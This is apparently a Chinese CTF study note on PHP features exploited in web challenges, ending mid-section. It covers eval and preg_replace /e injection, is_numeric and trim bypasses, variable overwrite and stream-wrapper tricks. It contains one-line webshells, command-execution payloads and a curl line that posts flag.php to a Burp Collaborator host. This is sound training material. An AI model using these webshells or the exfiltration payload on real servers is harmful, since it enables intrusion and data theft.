# php特性

## php函数

### php preg_replace()函数

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

-  存在的安全问题：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后) 

```php
preg_replace("/test/e",$_GET["h"],"jutst test");
```

<br />如果提交?h=phpinfo()，会执行这个函数 

### eval函数

- 该函数会把字符串当成php代码执行

### highlight_file函数

-  高亮显示php代码 

```php
highlight_file("index.php");
```

- 支持伪协议

### glob函数

-  glob() 函数返回一个包含匹配指定模式的文件名或目录的数组 

```php
<?php
print_r(glob("*.txt"));
?>
```

### intval函数

- 该函数在后面参数为0时，会自动检测输入的类型

```php
$num = 010574 //八进制
intval($num,0)
```

### file_put_contents

```php
file_put_contents($v3, $str) //向v3中写入str
```

- 该函数第一个参数可以传伪协议

```php
file_put_contents(php://filter/write=convert.base64-decode/resource=1.php, $str)

file_put_contents(php://filter/write=convert.base64-encode/resource=1.php, $str)
```

- 这里既可以用加密也可以用解密
  #### 

### is_file函数

:::info
可以使用伪协议绕过
:::

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668828764199-137758fa-3528-47b1-9988-504df39eccbc.png#averageHue=%23ced7c1&clientId=u6015fdbf-26e3-4&from=paste&height=136&id=ucbedc8f4&originHeight=272&originWidth=1674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49512&status=done&style=none&taskId=u1f8d6a67-e2a3-425e-a11c-fa022396076&title=&width=837)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668828737109-db5da990-bb8c-4245-a901-5d7b45192353.png#averageHue=%23fefefd&clientId=u6015fdbf-26e3-4&from=paste&height=236&id=uae828b51&originHeight=471&originWidth=1221&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44802&status=done&style=none&taskId=ud0f0e987-1ed8-4ffd-9e6e-0518c638679&title=&width=610.5)<br />当传入`file=php://filter/resource=1.php`时，is_file不认为这是一个文件，所以可以执行highlight_file

### is_numric函数

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668948013685-ecb22013-fdf1-4493-b2a3-14badd96f3a9.png#averageHue=%23fefefe&clientId=u88d22218-0a90-4&from=paste&height=353&id=uf466b17b&originHeight=706&originWidth=1342&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71368&status=done&style=none&taskId=u35336fb0-a698-4622-a2a7-eff13b50677&title=&width=671)

- %0a可以绕过这个函数

```php
<?php
$a = $_GET['num'];
var_dump(isnumric($a);//get传入num=%0a36，这里会返回true
?>
```

### trim函数

[https://www.php.net/manual/zh/function.trim](https://www.php.net/manual/zh/function.trim)![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668948260568-5e2a3eea-e0d5-4d13-ada3-8426554eb0dd.png#averageHue=%23f0efee&clientId=u88d22218-0a90-4&from=paste&height=297&id=u59ccb5ee&originHeight=594&originWidth=1607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118987&status=done&style=none&taskId=ua1a81ccd-8cf7-4964-8cba-27d3151a24b&title=&width=803.5)

- 可以用%0c绕过
  ## 

## php短标签

-  `<?php?>`为长标签，`<??>`为短标签，`<?=`相当于echo，以下四种输出均为2022 

```php
<?php echo(date('Y')) ?>
<?php eval("echo(date('Y'));") ?>


<?= date('Y'); ?>
<?php eval("?><?= date('Y');") ?>
```


   - 3可以理解为，用了php短标签，<?=相当于echo，不用再多写一个<?=
   - 4可以理解为，eval把字符串当成php代码执行，把括号里面的拿出来需要先闭合前面的<?php

#### 短标签一句话木马 

```php
<?=eval($_REQUEST['cmd']);?>
<?= `$_GET[1]`> //``反引号相当于system,请把system理解成和phpinfo()一样的函数

<?=phpinfo();  //还可以这样写
```


-  
-  对于eval函数，执行命令时，后面要加; 

```php
eval('phpinfo();')
```


## php上传机制

- php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是**/tmp目录**

### 临时文件命名规则

- 默认为 php+4或者6位随机数字和大小写字母
- linux下：phpXXXXXX

### \x09

- \x09表示ASCII码值为09的字符

## php特殊的执行函数命令

- PHP7中可以使用`('phpinfo')();`来执行函数，('system')('ls')
- php中只要变量后紧跟着()，那么就对这个变量进行函数调用

```php
$a = "phpinfo";
echo $a();
```

## php换行符

```php
echo "$var_name1 是数字" . PHP_EOL;
```

## php运算符

### 优先级

[https://www.php.net/manual/zh/language.operators.precedence.php](https://www.php.net/manual/zh/language.operators.precedence.php)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668653808347-981ae686-e191-484d-8656-8db69481427f.png#averageHue=%23f1f1f0&clientId=u5069738d-67bf-4&from=paste&height=1087&id=u742de12c&originHeight=2173&originWidth=1691&originalType=binary&ratio=1&rotation=0&showTitle=false&size=261857&status=done&style=none&taskId=ue191b743-65cb-499c-b1f9-f2336b8edf9&title=&width=845.5)

- 优先级从高到低

### 三元运算符

```php
$_str = $_GET['abc'] ? 'a' : 'b';
```

- 当abc为空时，返回，'b'，否则返回'a'
  ### 

## php的传值和引用

### 函数传值

[https://www.php.cn/php-notebook-172859.html](https://www.php.cn/php-notebook-172859.html)

```php
$a = 1;
function &func(&$a) {
return $a;
}
$b = func($a);
$c =& func($a);
$b = 2;
echo "a: $a, b: $b, c: $c.
/n";
//输出a: 1, b: 2, c: 1.
//可见对$b的修改不会影响$a
$c = 3;
echo "a: $a, b: $b, c: $c.
/n";
//输出a: 3, b: 2, c: 3.
//可见对$c的修改会影响$a
```

一个例子：

```php
<?php
  include("flag.php");
  $_GET?$_GET=&$_POST:'flag';
  $_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
  $_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
  highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?>

```

等同于

```php
$_GET?$_GET=&$_POST:'flag';
===============>
if(isset($_GET)){
	$_GET=&$_POST;
}else{
	'flag';
}

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

```

### php使用GET传递数组

```php
<?php 
	print_r($_GET['num']);
?>
```

- 正确的传递姿势为num[]

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667444074266-d3894477-db63-48b4-b4bd-c555e14cb72b.png#averageHue=%23f6f6f6&clientId=ue180f87e-8418-4&from=paste&height=146&id=lVALx&originHeight=292&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30346&status=done&style=none&taskId=u77271ed5-120f-4c54-aef7-c4286141401&title=&width=494)

- 这里不能/?num = array('foo')，它只是传递参数，并不能执行

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667444140248-fea9f94d-c1f5-4aaa-b355-a7eb09ee55b3.png#averageHue=%23f6f5f5&clientId=ue180f87e-8418-4&from=paste&height=134&id=WguYY&originHeight=267&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32910&status=done&style=none&taskId=ubddd551d-1185-416d-a250-2515925b65d&title=&width=552.5)

## 反射类

```php
<?php
class A{
public static $flag="flag{123123123}";
const  PI=3.14;
static function hello(){
    echo "hello</br>";
}
}
$a=new ReflectionClass('A');


var_dump($a->getConstants());  获取一组常量
输出
 array(1) {
  ["PI"]=>
  float(3.14)
}

var_dump($a->getName());    获取类名
输出
string(1) "A"

var_dump($a->getStaticProperties()); 获取静态属性
输出
array(1) {
  ["flag"]=>
  string(15) "flag{123123123}"
}

var_dump($a->getMethods()); 获取类中的方法
输出
array(1) {
  [0]=>
  object(ReflectionMethod)#2 (2) {
    ["name"]=>
    string(5) "hello"
    ["class"]=>
    string(1) "A"
  }
}

```

### 例子

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668655168158-0d641fb4-aecc-4373-8972-9a5151a45914.png#averageHue=%23fefefd&clientId=u5069738d-67bf-4&from=paste&height=302&id=ub4a726c3&originHeight=604&originWidth=1032&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52263&status=done&style=none&taskId=uf056f5d9-53eb-4bd4-b2f8-644ee6195f9&title=&width=516)

- 直接传入v2=echo new ReflectionClass

## $_GET和$_POST

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668742690571-dc4f9985-6205-4147-8b30-261d6d2bfc2c.png#averageHue=%23fefdfd&clientId=u4787ae80-6c34-4&from=paste&height=355&id=u7193ddfa&originHeight=710&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82433&status=done&style=none&taskId=u8d0fc32f-75f7-4ec4-ae61-b0158960f84&title=&width=445)

- 在提交时，如a=1，对于$_GET，它是一个数组，提交a=1，a是key,1是value

```php
<?php
foreach($_GET as $key => $value){
    var_dump('$key is'. $key.'$value is'. $value);
}
?>
```

## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668742837802-72a32219-7d44-4107-9073-37dcaaaf0853.png#averageHue=%23fcfbfb&clientId=u4787ae80-6c34-4&from=paste&height=611&id=uc87780b3&originHeight=1222&originWidth=2392&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112465&status=done&style=none&taskId=u917cfef2-3b5b-4dcf-ae5f-70cff9499e4&title=&width=1196)

## php变量名称

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668953847666-42ff61b3-ad79-4684-99f5-4ad49bcabcb2.png#averageHue=%23fefdfd&clientId=u1dab4844-0272-4&from=paste&height=199&id=ue7c76410&originHeight=398&originWidth=1450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51821&status=done&style=none&taskId=u8062125a-1040-4492-bf47-9b2be1e74ab&title=&width=725)

- 在php中变量名只有数字字母下划线，被get或者post传入的变量名，**如果含有空格、+、[、. 则会被转化为_**
- **在检测时，只会检测最先遇到的字符**

```php
CTF[SHOW.COM//[转换为_，.被保留
```

- 所以无法构造CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换

## 命名空间

\指根命名空间，也就是默认的命名空间

```php
<?php
\phpinfo();
phpinfo(); //两个代码等效
?>
```

## 类加载

[https://www.php.net/manual/zh/function.class-exists](https://www.php.net/manual/zh/function.class-exists)

- 在一个类调用class_exists时，会判断这个类是否加载

```php
<?php
spl_autoload_register(function ($class_name) {
    include $class_name . '.php';

    // 检查 include 后是否声明了类
    if (!class_exists($class_name, false)) {
        throw new LogicException("Unable to load class: $class_name");
    }
});

if (class_exists(MyClass::class)) {
    $myclass = new MyClass();
}

?>
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669538001558-2e15c824-af90-4110-b2df-a1d8e4990b28.png#averageHue=%23fefefe&clientId=u6daebb42-e26a-4&from=paste&height=444&id=ucf804d77&originHeight=976&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108714&status=done&style=none&taskId=ub8fd7c59-9718-4ff3-95dc-67082e4da9f&title=&width=538.1818065170417)

- 这里get传入参数`?..CTFSHOW..=phpinfo`，会调用__autoload方法。
  ## 
  ## 

## 常用payload

### 命令闭合

#### 行内注释

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668653918640-a512ff7d-45d4-4cba-8751-c47f225ef127.png#averageHue=%23fefefd&clientId=u5069738d-67bf-4&from=paste&height=238&id=u5234e527&originHeight=476&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48471&status=done&style=none&taskId=u5f62dbc9-8eec-42e0-9930-e14b3912990&title=&width=502.5)

- 这里可以构造闭合

```php
eval("$v2('ctfshow')$v3");

//传入v2=system("ls")/*&v3=*/;

eval("system("ls")/*('ctfshow')*/;");
//注意这里ls要＋双引号

```

#### 直接闭合

```php
eval("$v2('ctfshow')$v3");

//传入v2=phpinfo()?>%23&v3=;

eval("phpinfo()?>%23('ctfshow')$v3");
//注意这里ls要＋双引号
```

- 这里要用%23，用#可能不好使

### 正则匹配

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667478860805-a808c8c1-42a2-49f3-9ae7-68e73a7f468d.png#averageHue=%23fefdfd&clientId=uc3456c97-0885-4&from=paste&height=229&id=ezynW&originHeight=457&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32987&status=done&style=none&taskId=u79104fd6-0357-40d6-9d9d-1b03452cd58&title=&width=334.5)

- ^表示以php开头，$表示以php结尾，所以字符串只能是php
- /m表示多行匹配，因此会逐行查找。第二个正则没有多行查找，只看第一行，所以无法满足条件

```php
php//上面会先换行，因为%0a
```

### 弱类型

[https://www.php.net/manual/zh/language.operators.comparison.php](https://www.php.net/manual/zh/language.operators.comparison.php)

```php
<?php
$num = '';
    if($num==4476){
        die("1");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("2");
    }
    if(!strpos($num, "0")){
        die("3!");
    }
    if(intval($num,0)===4476){
        echo "yes";
    }

?>
```

- + 和 -在**字符串开头**时，会被认为是正号和负号，不会当成字符，仅限开头

#### 例1

[https://www.php.net/manual/zh/language.operators.comparison.php](https://www.php.net/manual/zh/language.operators.comparison.php)<br />**看文档**

#### ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668948195713-037c6890-7fee-464a-90c6-c553e897eefa.png#averageHue=%23fefefd&clientId=u88d22218-0a90-4&from=paste&height=340&id=u768af4f3&originHeight=679&originWidth=1216&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70346&status=done&style=none&taskId=ubad401f3-9f6e-453c-b60f-1d09b061d17&title=&width=608)

- is_numric用%0a绕过
- num !=='36'是不全等，因此传入的%0c36变成可见字符+36，因此不全等
- %0c绕过trim
- 传入的%0c36和36是弱类型比较，会先进行类型转换再比较，因此相等
  ### 
  ### 

### null绕过if判断

#### 例1 md5或sha1

```php
<?php
  include("flag.php");
  highlight_file(__FILE__);
  if (isset($_POST['a']) and isset($_POST['b'])) {
  	if ($_POST['a'] != $_POST['b'])
  		if (md5($_POST['a']) === md5($_POST['b']))
  			echo $flag;
  		else
  			print 'Wrong.';
  }
?>
```

- 这里可以传入a[]=1，b[]=2，此时md5($_POST['a']、md5($_POST['b']都会返回null

### 变量覆盖

[https://blog.csdn.net/qq_41381461/article/details/90047616](https://blog.csdn.net/qq_41381461/article/details/90047616)

```php
<?php
$id=5;
foreach ($_GET as $key => $value) {
	$$key = $value;
}
echo $a;
?>

```

- **如果传入id = 1，也就是会把$id =1。**

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668744187195-d9095fb0-68f0-4eaf-a360-d249f18c1bd3.png#averageHue=%23fefdfc&clientId=u4787ae80-6c34-4&from=paste&height=330&id=u73e5c389&originHeight=659&originWidth=639&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76205&status=done&style=none&taskId=u876eb246-9f52-4648-aeab-e7290532822&title=&width=319.5)

- 这里如果传入get参数x=flag，也就是会$x=$flag
- 这里可以构造后面的 post['flag'] == $flag
- 那么可以让左右两边都等于Null，也就是post不提交，get提交flag为空,但是这样会覆盖原有的flag，因此需要先把flag赋值给suces，再置空

```shell
?flag=&suces=flag
```

#### 变量覆盖$$ 和 &

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668826674935-c9ded884-ece0-420b-a4e3-274b205c3793.png#averageHue=%23fefefe&clientId=u6015fdbf-26e3-4&from=paste&height=388&id=u2b56d7e9&originHeight=776&originWidth=1789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86966&status=done&style=none&taskId=uf640e120-9361-452f-a6ca-a77fcbd665b&title=&width=894.5)

```php
<?php
function getFlag(&$v1,&$v2){
    //$$v1=$ctfshow    &$$v2= &$flag
    //eval("$$v1 = &$$v2;");   --- >  eval("$ctfshow = &$flag;")
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


$v1 = 'ctfshow';
$v2 = 'flag';
?>
```

- 所以这里需要使v2=flag，但flag是外部变量，无法直接访问，因此可以用Global
  :::info
  [https://www.runoob.com/php/php-superglobals.html](https://www.runoob.com/php/php-superglobals.html)<br />$GLOBALS 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。<br />$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
  :::

```php
<?php 
$x = 75; 
$y = 25;
 
function addition() 
{ 
    $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y']; 
}
 
addition(); 
echo $z; 
?>
```

#### parse_str + argv

### 

### e->科学计数法

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668737646736-7eca6fcb-fa10-4b3d-8e8d-88d4a4f5ae01.png#averageHue=%23fefefe&clientId=u4787ae80-6c34-4&from=paste&height=249&id=ud8870260&originHeight=497&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37119&status=done&style=none&taskId=u3f72e7d5-c7b7-4df1-a2a2-8d3258bbd1c&title=&width=323)

```php
substr("abcde" ,2 )//返回cde
call_user_func($v1, $s)//回调函数，$v1为函数名称，$s是传到函数中的参数
file_put_contents($v3, $str)//向v3中写入字符串str
```

- 这里显然是需要构造一个字符串v2，让v2在调用某个函数后，可以写到文件中
- 这里还要求v2得是数字，因此中间可以有e，即科学技术法的表示形式
- **php5下is_numeric可识别16进制，如0x2e**

构造`<?=`cat *`;`

- x对字符串先base64加密，再用16进制编码
- 因此对$v1传入hex2bin，即将16进制字符串转为二进制
- file_put_contents函数可以传入伪协议，用base64解码后写入到1.php中

**注意点：这个先base64-encode再hex编码后，最后可能有2d是空格，需要去掉**


### %00截断

- 00截断是操作系统层的漏洞。由于操作系统是C语言或[汇编语言](https://so.csdn.net/so/search?q=%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020)编写的(php也是c语言编写的)，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668775864424-5821c228-1d80-4cdd-acd5-f67d2752463f.png#averageHue=%23fefefd&clientId=u9bb5c3e9-c140-4&from=paste&height=245&id=u86fd5c54&originHeight=490&originWidth=1095&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41229&status=done&style=none&taskId=u3a695074-82e1-4533-b6e7-cc5240e533f&title=&width=547.5)

- 这里可以通过传入`a%00778`，%00后就可以写数字了

### 类的命令执行

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668777107617-59c8e3e4-be46-4581-b79d-fb71b374de71.png#averageHue=%23fefefe&clientId=u9bb5c3e9-c140-4&from=paste&height=205&id=ub9d80391&originHeight=410&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34159&status=done&style=none&taskId=u86011799-afbc-427f-8360-6ee5a5b10ab&title=&width=588)

- 看题的想法是需要找到一个类，在类的()里可以执行phpinfo()

Exception类：

```php
echo new Exception('aaa') //输出中有aaa
echo new Exception(phpinfo())//会输出phpinfo()
```

- 因此我可以rce

```php
v1=Exception&v2=system('ls')
//相当于先执行system('ls'),返回flag.txt，再调用flag.txt()，无返回结果
v1=Exception&v2=system('echo phpinfo')
//这就相当于'phpinfo'()---->可以执行phpinfo()函数
```

#### 遍历文件类

```php
class FilesystemIterator extends DirectoryIterator
```

FilesystemIterator：遍历文件<br />DirectoryIterator：遍历目录

```php
<?php
//会输出当前目录下的所有文件
$dir = new DirectoryIterator(dirname(__FILE__));
foreach ($dir as $fileinfo) {
    echo $fileinfo;
}
//输出第一个目录
echo new DirectoryIterator(dirname(__FILE__));
//输出第一个文件

echo new FilesystemIterator(dirname(__FILE__));
?>
```

##### 获取当前目录

- 点(.)：代表当前目录
- getcwd()
- __FILE__ 常量包含当前(例如包含)文件的完整路径和文件名

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668823979619-02eab651-b33b-4baf-a8c0-118418e838bf.png#averageHue=%231e1e1e&clientId=u6015fdbf-26e3-4&from=paste&height=574&id=uea5dcc42&originHeight=1147&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49935&status=done&style=none&taskId=uf85737f5-3b4f-456a-8204-2f27689f587&title=&width=507.5)

### 伪协议绕过is_file

[https://www.php.net/manual/zh/function.is-file](https://www.php.net/manual/zh/function.is-file)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668930732049-26a81090-3212-450e-832d-005cd5fdba6f.png#averageHue=%23fefefe&clientId=ue0baabe6-abb7-4&from=paste&height=243&id=u72720144&originHeight=486&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45245&status=done&style=none&taskId=u128cf76b-32fb-4c56-bbae-917de354596&title=&width=656)

- 查看文档发现支持用伪协议取文件绕过is_file
- 这里使用zip协议

[https://www.php.net/manual/zh/wrappers.compression.php](https://www.php.net/manual/zh/wrappers.compression.php)

```php
compress.zlib://file.gz //也可以是file.txt
```

## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668931327022-0f5d3d7b-898c-4524-aef0-9992f31fa79d.png#averageHue=%235d7c62&clientId=ue0baabe6-abb7-4&from=paste&height=184&id=u14b83fcf&originHeight=367&originWidth=1981&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56091&status=done&style=none&taskId=u2e70c29f-b09b-4f57-9d64-07c280e1163&title=&width=990.5)

### extract

[https://www.php.net/manual/zh/function.extract](https://www.php.net/manual/zh/function.extract)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668955516930-6227cc62-f015-4a80-994e-53e69f8a649a.png#averageHue=%23fefefd&clientId=u1dab4844-0272-4&from=paste&height=217&id=ub1f7ca77&originHeight=434&originWidth=1886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59756&status=done&style=none&taskId=u5ef3749c-704a-4aee-b5d9-abb50464916&title=&width=943)

- extract从数组中将变量导入到当前的符号表

```php
CTF_SHOW=1&CTF[SHOW.COM=2&fun=extract($_POST)&fl0g=flag_give_me

```

- 这里会变成$fl0g=flag_give_me

#### 例题

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669260118136-5923b33f-168e-481f-bfb6-3264592a343d.png#averageHue=%23fefefd&clientId=u29acd7f1-1e00-4&from=paste&height=171&id=u51645060&originHeight=376&originWidth=1580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42963&status=done&style=none&taskId=u165ff297-7f46-4b27-9b03-383b0754c7a&title=&width=718.1818026156468)

- 这里要覆盖变量
- 既然是extract($_POST)

```php
_POST[key1]=36d&_POST[key2]=36d
```

### parse_str+argv

#### argv

1、cli模式（命令行）下

	第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669033509815-71439794-6816-42ad-bd6e-7500faaf2c34.png#averageHue=%231e1e1e&clientId=u77333d8d-acc7-4&from=paste&height=68&id=u1c66defc&originHeight=135&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24707&status=done&style=none&taskId=ufb2d2e78-85d8-460f-a39f-6c625b93450&title=&width=490)

2、web网页模式下
:::info
在web页模式下必须在php.ini开启**register_argc_argv配置项**<br />	<br />设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER['argv']才会有效果

这时候的`$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`

$argv,$argc在web模式下不适用
:::

- 下面打印的是$_SERVER['argv']

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669033486617-a633ffed-4984-4ffc-a048-53cbd539cced.png#averageHue=%23fcfcfc&clientId=u77333d8d-acc7-4&from=paste&height=606&id=ub597e7fc&originHeight=1212&originWidth=1530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73057&status=done&style=none&taskId=ue46db48f-bed4-42f0-9a3a-1746021af6b&title=&width=765)

#### parse_str

[https://www.php.net/manual/zh/function.parse-str](https://www.php.net/manual/zh/function.parse-str)

```php
<?php
$str = "first=value&arr[]=foo+bar&arr[]=baz";

// 推荐用法
parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz

// 不建议这么用
parse_str($str);
echo $first;  // value
echo $arr[0]; // foo bar
echo $arr[1]; // baz
?>
```

#### 例子

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669033630074-1b59f295-ff32-4a9d-ab7f-91fe2af77fa4.png#averageHue=%23fefefd&clientId=u77333d8d-acc7-4&from=paste&height=194&id=iVv94&originHeight=387&originWidth=2164&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60455&status=done&style=none&taskId=u3a59aa68-a3d7-4436-8bbd-01d72f661be&title=&width=1082)

- 这里利用argv对$fl0g进行变量覆盖

```php
//get提交
a=1+fl0g=flag_give_me//+相当于空格，
//post提交
CTF_SHOW=1&CTF[show.COM=2&fun=parse_str($a[1])
/*
$a[1] = 'fl0g=flag_give_me'
parse_str($a[1])--->变成 $fl0g = 'fl0g_give_me';
*/

```

### gettext绕过对字母+数字过滤

[https://www.php.net/manual/zh/function.gettext.php](https://www.php.net/manual/zh/function.gettext.php)
:::info
You may use the underscore character '_' as an alias to this function.
:::

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669036567072-367a7889-fac7-4f9a-844f-e5a2f2a23ae8.png#averageHue=%23fefefe&clientId=u77333d8d-acc7-4&from=paste&height=313&id=u56f47c69&originHeight=688&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46615&status=done&style=none&taskId=u036e35a7-2a95-4a86-8eab-8b02c548020&title=&width=527.2727158443989)

```php
f1=_&f2=get_defined_vars
```

### 目录穿越

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669037937230-ff75d285-402b-4ae6-a70d-50f9b03ffa9f.png#averageHue=%23fefefd&clientId=u77333d8d-acc7-4&from=paste&height=133&id=uad4e09de&originHeight=292&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22508&status=done&style=none&taskId=u296c3772-f9ec-4860-9693-9391a3c9c10&title=&width=270.4545395926012)

```php
f=../ctfshow/../../flag.php//虽然ctfshow目录不存在，但是可以访问
```

- 记得查看源代码

### 溢出绕过正则表达式

:::info
正则表达式对长度有限制，当超过一定长度时，就不再检测
:::
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669089056342-03b72ec1-2375-42c1-85af-a4ae26380538.png#averageHue=%23fefefd&clientId=u1cecbf18-abab-4&from=paste&height=227&id=u6babfe5d&originHeight=500&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43526&status=done&style=none&taskId=uf2788f21-334a-483e-bc7b-33ad410e92e&title=&width=327.2727201792821)

```php
<?php
echo str_repeat('very', 250000).'36Dctfshow';
?>
```

### 无回显命令执行

#### curl 带出

##### curl

[https://www.jianshu.com/p/6049f23ee204](https://www.jianshu.com/p/6049f23ee204)

- 在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具

##### Burp Collaborator

[https://blog.csdn.net/fageweiketang/article/details/89073662](https://blog.csdn.net/fageweiketang/article/details/89073662)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669212557549-4846a352-5f4d-42bb-9369-9dadf2454fe5.png#averageHue=%23fefdfc&clientId=ud4c65044-a7b8-4&from=paste&height=435&id=u420305ca&originHeight=957&originWidth=1744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=211720&status=done&style=none&taskId=udebe1b43-0eba-4510-85ca-add92343edc&title=&width=792.7272555453721)

- 首先 burp 发送 payload 给目标程序，以上图为例，param 存在漏洞注入点，其 payload 为外部的服务器 url 地址，随后目标程序若进行解析或则引用调用等，则会去访问这个地址，而这个地址是我们的 collaborator 服务器，所以 collaborator 会记录**其访问的请求信息以及响应信息和 dns 的信息**。
- 而当 burp 发送 payload 后，就会不断的去问 collaborator 服务器，你收到我发送的 payload 交互了么，这时 collaborator 就会将交互信息告诉 burp，burp 最后进行报告。

##### 例题

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669212453633-e1c71f33-feb7-4dd1-9fae-28b27c17d74c.png#averageHue=%23fefdfd&clientId=ud4c65044-a7b8-4&from=paste&height=148&id=u4ee6380a&originHeight=326&originWidth=1000&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36175&status=done&style=none&taskId=u81c0143c-51b1-477e-b91c-bbdc9c67ede&title=&width=454.54544469344734)

- 这个里面只能用反引号执行命令，反引号相当于shell_exec，对于执行结果没有回显，因此需要curl带外攻击，即需要一个新的服务器参与

payload：

```php
?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
//前面是变量覆盖，-X指定请求的方式
```

- 前面是变量覆盖
- -X指定请求的方式 -F/--form <name=content> 模拟http表单提交数据 
- 后面的二级域名是在Burp中复制的
- @用于读取文件内容
- 如果没有@，就是这样的

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669213260020-f4b98bb0-12ae-4df8-b302-5e3519cf2bf8.png#averageHue=%23f7f7f7&clientId=ued28d905-c370-4&from=paste&height=222&id=u43282726&originHeight=488&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20007&status=done&style=none&taskId=u53434653-d698-432e-ac77-596392398bc&title=&width=478.18180781750664)

##### 总结

- 相当于用@去读取了文件的内容，在 Burp Collaborator中可以看到request的包，因此就显示出了flag。

#### 利用dnslog带出

:::info
